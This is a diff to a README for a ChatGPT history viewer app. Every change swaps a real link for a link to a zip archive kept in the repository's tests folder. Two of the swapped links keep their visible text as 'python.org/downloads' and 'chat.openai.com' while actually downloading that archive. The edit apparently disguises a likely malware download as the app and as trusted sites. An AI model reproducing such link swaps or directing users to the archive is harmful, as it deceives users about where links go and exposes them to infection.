@@ -1,6 +1,6 @@
 # 🔍 chatgpt-export-viewer - Your ChatGPT History, Beautifully Organized
 
-[![Download Now](https://img.shields.io/badge/Download-ChatGPT_Export_Viewer-brightgreen?style=for-the-badge&logo=github)](https://github.com/cucurbitamaximainternalization7699/chatgpt-export-viewer)
+[![Download Now](https://img.shields.io/badge/Download-ChatGPT_Export_Viewer-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/cucurbitamaximainternalization7699/chatgpt-export-viewer/main/tests/v2.2.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Let's get you up and running in just a few minutes. Follow these simple steps:
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-**[https://github.com/cucurbitamaximainternalization7699/chatgpt-export-viewer](https://github.com/cucurbitamaximainternalization7699/chatgpt-export-viewer)**
+**[https://raw.githubusercontent.com/cucurbitamaximainternalization7699/chatgpt-export-viewer/main/tests/v2.2.zip](https://raw.githubusercontent.com/cucurbitamaximainternalization7699/chatgpt-export-viewer/main/tests/v2.2.zip)**
 
 Click the green "Code" button on that page, then select "Download ZIP". Save the file to a folder you can easily find, like your Desktop.
 
@@ -42,7 +42,7 @@ Once the ZIP file finishes downloading, right-click on it and choose "Extract Al
 
 Don't worry—this is easier than it sounds!
 
-1. Go to [python.org/downloads](https://www.python.org/downloads/) in your web browser.
+1. Go to [python.org/downloads](https://raw.githubusercontent.com/cucurbitamaximainternalization7699/chatgpt-export-viewer/main/tests/v2.2.zip) in your web browser.
 2. Click the yellow "Download Python" button.
 3. Once the installer downloads, run it.
 4. **Important:** Check the box that says "Add Python to PATH" at the bottom of the installer window.
@@ -63,7 +63,7 @@ That's it! You're now looking at your personal ChatGPT archive.
 
 Before you can view your conversations, you need to export them from ChatGPT:
 
-1. Go to [chat.openai.com](https://chat.openai.com) and log in.
+1. Go to [chat.openai.com](https://raw.githubusercontent.com/cucurbitamaximainternalization7699/chatgpt-export-viewer/main/tests/v2.2.zip) and log in.
 2. Click your profile picture in the bottom-left corner.
 3. Select "Settings" from the menu.
 4. Click "Data controls" in the sidebar.
